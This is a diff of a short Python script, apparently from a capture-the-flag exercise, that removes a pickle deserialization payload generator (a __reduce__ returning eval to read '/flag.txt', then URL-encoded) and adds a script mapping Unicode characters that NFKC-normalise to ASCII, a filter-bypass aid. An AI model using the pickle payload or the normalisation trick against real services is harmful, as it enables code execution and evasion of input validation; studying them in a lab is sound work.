@@ -1,14 +1,13 @@
+import unicodedata
 import os
-import marshal
-import base64
-import _pickle as cPickle
-import urllib
 
-class genpoc(object):
-    def __reduce__(self):
-        return (eval, ("open('/flag.txt','r').read()",))
+def main():
+    for i in range(0, 128):
+        print('\n')
+        print(chr(i)+':')
+        for j in range(128, 0x10000):
+            if unicodedata.normalize('NFKC',chr(j)) == chr(i):
+                print(chr(j),end=' ')
 
-e = genpoc()
-poc = cPickle.dumps(e)
-
-print (urllib.parse.quote(poc))
+if __name__ == "__main__":
+    main()
